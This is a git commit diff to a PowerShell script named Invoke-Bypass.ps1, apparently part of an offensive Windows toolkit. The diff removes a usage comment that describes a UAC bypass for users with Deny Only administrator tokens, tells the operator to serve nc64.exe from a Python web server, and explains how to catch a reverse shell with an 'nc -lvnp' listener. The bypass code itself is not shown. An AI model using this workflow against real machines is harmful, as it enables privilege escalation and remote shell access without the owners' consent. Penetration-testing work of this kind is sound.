98e4f514f21d95cc509f30a62f0d430f67b91ed3
overgrowncarrot1 <78485709+overgrowncarrot1@users.noreply.github.com>
2025-02-19 20:20:34 -0500

    Update Invoke-Bypass.ps1

--- Invoke-Bypass.ps1
+++ Invoke-Bypass.ps1
@@ -1,21 +1,4 @@
 function Invoke-Bypass {
-    <#
-    UAC Bypass if you belong to administrators group but if used for Deny Only, this can bypass that and
-    allow for the user to have all privileges that are for an administrator, thus allowing them to run administrator
-    powershells, administrator level winpeas and more.
-
-    Start python server on port 80 in your tools directory (where nc64.exe is located).
-    If you do not have all the tools, you can download the shell script from the following location:
-    wget https://github.com/overgrowncarrot1/Invoke-Everything/blob/main/Windows-Tools.sh
-
-    If nc64.exe is not on target machine, either download to C:\Temp or run Invoke-Tools, found here:
-    https://github.com/overgrowncarrot1/Invoke-Everything/blob/main/Invoke-Tools.ps1
-
-    To run invoke-bypass: 
-    - Run the following command: invoke-bypass -LHOST <kali_ip> -LPORT <listening_port_on_kali_machine>
-    - Make sure to start nc -lvnp <lport> on your Kali machine
-    #>
-
     [cmdletbinding()]
     param(
         [Parameter(Position = 0, Mandatory = $true)]
